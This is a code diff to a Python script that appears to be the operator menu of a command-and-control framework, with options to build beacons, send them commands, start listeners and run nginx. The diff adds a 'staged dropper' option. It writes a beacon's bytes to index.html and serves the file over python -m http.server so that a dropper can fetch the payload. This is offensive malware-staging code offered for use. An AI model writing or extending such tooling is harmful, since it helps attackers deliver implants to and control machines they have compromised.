@@ -100,24 +100,32 @@ def startMTLS():
     subprocess.Popen('systemctl start nginx', close_fds=True)
 
 
-def stagedDropper(beacon, outfile):
+def stagedDropper(beacon):
     # Get the bytes value of our beacon
     # Write the bytes to an html file
     # Host it with python? or flask?
     # Dropper grabs the bytes and writes to disk
-    with open(beacon, "rb") as fin, open(outfile, 'wb') as fout:
+    with open(beacon, "rb") as fin, open('index.html', 'wb') as fout:
         fout.write(fin.read())
+    subprocess.Popen('python -m http.server', close_fds=True)
 
 
 if __name__ == '__main__':
+    # Let's replace this... https://learnpython.com/blog/python-match-case-statement/
     while 1:
         choice = input("Generate a new beacon (1) "
                        "or interact with beacons (2) "
                        "or start listeners (3) "
-                       "or run nginx (4) > ")
+                       "or run nginx (4) "
+                       "or start a staged dropper (5) > ")
         if choice == '1':
             BobTheBuilder()
         if choice == '2':
             SendCommand()
         if choice == '3':
             startListener()
+        if choice == '4':
+            startMTLS()
+        if choice == '5':
+            bacon = input('Enter beacon name > ')
+            stagedDropper(bacon)
